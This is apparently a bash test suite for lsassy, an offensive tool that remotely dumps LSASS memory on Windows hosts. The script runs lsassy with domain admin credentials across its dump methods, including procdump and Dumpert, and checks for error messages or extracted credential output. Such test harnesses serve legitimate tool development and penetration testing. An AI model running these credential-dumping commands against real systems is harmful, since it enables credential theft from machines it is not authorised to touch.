#!/bin/bash

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

if [ ! -f "$DIR/tests.config.sh" ]
then
  echo -n "Error: "
  echo "$DIR/tests.config.sh does not exist"
  echo "Please rename tests.config.sh.tpl to tests.config.sh and change its content to match your environment"
  exit
fi

source ./tests.config.sh

echo -n "[TEST] Connexion error : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@192.254.254.254" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Connexion error')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Authentication error : "
RESULT=$(lsassy -j "test/test:t3st@${IP_OK}" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Authentication error')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Access denied : "
RESULT=$(lsassy -j "${USER}@${IP_OK}" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Access denied')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Error opening share : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" --dumppath "E\$/Windows/Temp" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Error opening share')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Error opening file : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" --dumppath "C\$/Windws/Temp" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Error opening file')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi


echo -n "[TEST] Method not supported : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 99 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c 'Method not supported')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi


echo -n "[TEST] lsass is protected : "
if [ "$IP_PROTECTED" != "" ] && [ "$PROCDUMP" != "" ]
then
  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_PROTECTED}" -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
  RET=$(echo "$RESULT" | grep -c 'protected')
  if [ "$RET" -gt 0 ]
  then
    echo -e "\e[32mSuccess\e[39m"
  else
    echo -e "\e[31mFailure\e[39m"
    echo -e "--- Log ---\n$RESULT\n-----------"
  fi
else
  echo -e "\e[33mSkipped\e[39m"
fi

echo -n "[TEST] json : "
RESULT=$(lsassy "${DOMAIN_ADMIN}@${IP_OK}" --raw -j  2>&1)
RET=$(echo "$RESULT" | grep -c '"LKAPP01\$"')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] raw : "
RESULT=$(lsassy "${DOMAIN_ADMIN}@${IP_OK}" --raw  2>&1)
RET=$(echo "$RESULT" | grep -c '\\LKAPP01\$')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 0 : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 0 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 1 : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 1 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi


echo -n "[TEST] Method 2 : "
if [ "$PROCDUMP" != "" ]
then
  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
  RET=$(echo "$RESULT" | grep -c '{')
  if [ "$RET" -gt 0 ]
  then
    echo -e "\e[32mSuccess\e[39m"
  else
    echo -e "\e[31mFailure\e[39m"
    echo -e "--- Log ---\n$RESULT\n-----------"
  fi
else
  echo -e "\e[33mSkipped\e[39m"
fi

echo -n "[TEST] Method 3 : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 3 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 4 : "
RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 4 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi


echo -n "[TEST] Method 5 : "
if [ "$DUMPERT" != "" ]
then
  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 5 --timeout 1 -u /home/pixis/Tools/Windows/Dumpert/Outflank-Dumpert.exe  2>&1)
  RET=$(echo "$RESULT" | grep -c '{')
  if [ "$RET" -gt 0 ]
  then
    echo -e "\e[32mSuccess\e[39m"
  else
    echo -e "\e[31mFailure\e[39m"
    echo -e "--- Log ---\n$RESULT\n-----------"
  fi
else
  echo -e "\e[33mSkipped\e[39m"
fi